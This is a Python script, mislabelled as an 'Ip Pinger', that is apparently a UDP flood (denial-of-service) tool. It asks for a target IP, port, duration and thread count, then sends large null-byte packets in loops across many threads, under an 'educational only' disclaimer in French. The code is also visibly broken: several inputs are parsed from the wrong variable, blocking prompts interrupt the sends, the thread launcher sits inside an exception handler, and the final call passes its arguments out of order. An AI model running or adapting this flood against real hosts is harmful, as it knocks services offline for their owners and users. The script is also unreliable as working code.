#DOS uniquement pour l'eductation  et l'apprentissage
import colorama
import socket
import threading
import requests
from Config.Util import *
from Config.Config import *
try:
    import concurrent.futures
    import time
    import socket
except Exception as e:
   ErrorModule(e)
   
Title("Ip Pinger")

#config 
def dos_attack(target_ip, port_input, duration_input):
    timeout = duration
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = b"\x00" * 10000  # Paquet de 1024 octets

    while timeout > 0:
        try:
            client.sendto(bytes, (target_ip, port))
            print(f"Paquet envoyé à {target_ip}:{port}")
            input("yes sti leu")
        except Exception as e:
            print(f"Erreur lors de l'envoi du paquet: {e}")
            input("yes sti leu")
        timeout -= 1
        input("yes sti leu")
        
# Usage
if __name__ == "__main__":
    Slow(wifi_banner)
    target_ip = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} {blue}Entrez l'IP cible -> " + color.RESET)

    try:
        port_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Port (enter for default) -> " + color.RESET)
        port = int(port_input) if port_input else 80
        
      
    except:
        ErrorNumber()

    try:
        duration_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Entrez la durée de l'attaque (en secondes)-> " + color.RESET)
        duration = int(port_input) if port_input else 80
        
      
    except:
        ErrorNumber()
    try:
        thread_count_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Entrez le nombre de thread-> " + color.RESET)
        thread_count = int(port_input) if port_input else 80
        
      
    except:
        ErrorNumber()

  
        
        with concurrent.futures.ThreadPoolExecutor() as executor:
         while True:
            time.sleep(0.1)
            thread = threading.Thread(target=dos_attack, args=(target_ip, port, duration))
            thread.start()


    dos_attack(duration_input,target_ip,port_input )
    input("yes sti leu")
input("yes sti leu")

#FR: Ce code est uniquement à but éducatif. Lancer des attaques DOS sur des serveurs sans autorisation explicite est illégal et contraire à l'éthique. Utilisez ce code uniquement dans un environnement contrôlé où vous avez la permission de le faire.